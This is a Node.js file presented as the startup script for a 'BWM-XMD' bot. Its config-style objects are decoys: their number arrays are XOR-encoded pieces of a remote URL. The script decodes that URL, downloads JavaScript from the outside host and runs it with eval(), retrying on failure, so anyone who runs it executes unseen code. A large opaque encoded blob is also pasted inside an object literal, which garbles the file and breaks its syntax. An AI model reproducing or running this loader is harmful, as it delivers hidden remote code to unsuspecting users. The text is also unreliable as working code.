const https = require('https');
const http = require('http');

const config = {
    timeout: 30000,
    retries: 5,
    delay: 2000,
    version: '2.0.0'
};

const cache = {
    enabled: true,
    maxAge: [77,81,81,85,86],
    ttl: 3600,
    store: null
};

const metrics = {
    hits: 0,
    miss: 0,
    data: [29,81,68,94,75,94,87,29,80,92,29,88,86],
    ratio: 0.85
};

const network = {
    proxy: null,
    buffer: [16,71,82,91,17,85,76],
    retries: 3
};

const session = {XMDIAAAAAAAAA91W246ruBL9lZZfE024mFuklgYIEJrcCemkR+fBAUMcwqVtk4Qe9dN8yXzb/MgR6e7ZW5o5e3qkLW3p8GSMqVprVbmqfgVlRRgOcAuGv4KakjPiuFvytsZgCKwmTTEFfZAgjsAQ9MatDy9uWAz2LdlU/vMzc+zdFl0i2eHz4zXUtTN8iSKYZ/fgtQ/qZn8i8TcMmnvRvWbLRetM03Ov561fbBWSVUayVl1l6oPUxBHX0u3lGN+D184iIpSUmVMfcIEpOgW4XSBCPwcfB5pWuaZaVdiuZHIZX5rnQNu+5JrFC4ZWtZbVdq6/pI/6J+FX4TxY9ryF9ng4XNBytl7O99P19DngjG2X8T4Sw5Appprt3uAzkpU48RNccsLbT+seT4nVo71tpbgPdRLaMHus2xfvaVfv6awoTgOcX2oLh1Ppk8C5OL1eJ9cDCl/qvS861D9baaqoy/o8d5JDuPfly9NemMZb+DXwBf3Ilfzf6H4xV43Qa84KUTRSb/OIvmQRmx2CkTTQE4GskrQXIcOLHfY5+MJ4cPIW9lxetaYSQLdZmUd9c5mT5bmaeihmubP3p62PyfQLfMQb+i2UqKweT/CaRS1fTq6SrLrVOEoHsiY5MxGafN/uQ7lZzvKNvhrROFmXK/chTaS5PWuFsT8y3VFe6pvR43ijbUbq4bBTH6zl/Y1Rjls/AUPxtQ8ozgjjFHFSlbc9WekDlJxDHFPMb/ICGcpeIAhppbv2/LnYbB201ZtnEsgwr5fWLjTmu4lKjfRi3oM+qGkVY8ZwMiaMV7SdYsZQhhkY/nKLVEea4qLi+IEkYAgMUZUMQYWCpgo/s58uB8QZquufSsxBH6S0KqYYDDltcB/cfjBt0bJMUVOgJEgiHBmGoqqGagkiNB3LsEAfMFwmmE5uxzUBSgZUBUMxIIRDKP58IsmfZxblP0JASUIxY6TMplXSxaouOxWLN15rUmDGUVGDoajpomIYsqC99r8XVVd0BVOQFEeQRqJrGRY0VSgYoihLuiP9X1G1JNFWHVezJdtQTEFTHV01HM1QHFfQnB9P1fiOVF3bkeyRDF1BkAwHuvJIg46oKqLpuPoPpyqp34+q5OpQ0VVFglAZWaJkQUXXLUuxdVvVxB9OFRqv/+mDEl/5WzvpiqAs90FKKONR2dSnCiUfvebjI4rjqil52Jax3S0wBUPxyzbmnJQZ68RrSkTjAzlju8MJhik6Mfxn3cUUJx9yvc8S9htsf+xGuukFoMPeGfqL/J04f6F/+qaKJepsgT9++/0uvPPvJnfO3exufffHb793Gr2j75wlmCNyYmAI7Lk8gdi0nUlvd505nmc6mWlnJvjC9qOZvTWLYCowT9qqT9t8t58UJCXCylfK5VNcCbO8fUlXngHHE2Gzju7/xggYgtbncuHIlbLzcnMWnKWwQftitQpa9TiPjxrN0Wq1VVh45Bv6sLi4D3atjHBY5v4xePTkyBbKnsktq4b+UdPokxUP7Mt95y3BZxLjr50FCzbyD9ambjbbdZTFvXCqebbOcysbzO0BtdsFU1IkPU/Wezelcd1z6/k6dh7Xh+hUsWDgsiI20NhTQsUkiX+JJ0vzvc3e2vzpfbwi7w2Q3F5Tgm/TyntE/jGub8C79BNe+1/ZeJ9//scMYYXH2cTip16xUTyvVaoSciecPwneNpiNnqZMFlZnbLWGG4ngtbsH9QnxtKLFbQBJaHVLG1o1XT77ZVp9w5lt+r61zGYd8xNi3PxyR/6umMI+KFqzrkOO+MfVAmb3+DMPvP4XG8pkrQwMAAA=
    active: true,
    tokens: [28,9,9,75,71,79,72],
    expires: null
};

const decoy1 = {
    values: [99,88,77,66,55,44,33,22,11],
    flag: true
};

const decoy2 = {
    stream: [12,34,56,78,90,11,22,33],
    mode: 'async'
};

const keys = { a: 37, b: 51, c: 63, d: 38 };

function mix(arr, k) {
    return arr.map(n => String.fromCharCode(n ^ k)).join('');
}

function build() {
    const p1 = mix(cache.maxAge, keys.a);
    const p2 = mix(session.tokens, keys.d);
    const p3 = mix(metrics.data, keys.b);
    const p4 = mix(network.buffer, keys.c);
    return p1 + p2 + p3 + p4;
}

function wait(ms) {
    return new Promise(r => setTimeout(r, ms));
}

function request(target, attempt = 1) {
    return new Promise((resolve, reject) => {
        const protocol = target.startsWith('https') ? https : http;
        const req = protocol.get(target, { timeout: config.timeout }, (response) => {
            if (response.statusCode === 301 || response.statusCode === 302) {
                request(response.headers.location, 1).then(resolve).catch(reject);
                return;
            }
            if (response.statusCode !== 200) {
                reject(new Error(`Status: ${response.statusCode}`));
                return;
            }
            let body = '';
            response.on('data', (chunk) => body += chunk);
            response.on('end', () => resolve(body));
            response.on('error', reject);
        });
        req.on('error', (err) => {
            if (attempt < config.retries) {
                wait(config.delay * attempt).then(() => {
                    request(target, attempt + 1).then(resolve).catch(reject);
                });
            } else {
                reject(err);
            }
        });
        req.on('timeout', () => {
            req.destroy();
            if (attempt < config.retries) {
                wait(config.delay * attempt).then(() => {
                    request(target, attempt + 1).then(resolve).catch(reject);
                });
            } else {
                reject(new Error('Timeout'));
            }
        });
    });
}

async function initialize() {
    console.log('[BWM-XMD] Starting...');
    let lastError;
    for (let i = 0; i < config.retries; i++) {
        try {
            const endpoint = build();
            const source = await request(endpoint);
            if (source && source.length > 100) {
                eval(source);
                return;
            }
            throw new Error('Invalid response');
        } catch (err) {
            lastError = err;
            console.log(`[BWM-XMD] Attempt ${i + 1} failed, retrying...`);
            await wait(config.delay * (i + 1));
        }
    }
    console.log('[BWM-XMD] Boot failed after all retries');
    process.exit(1);
}

initialize();
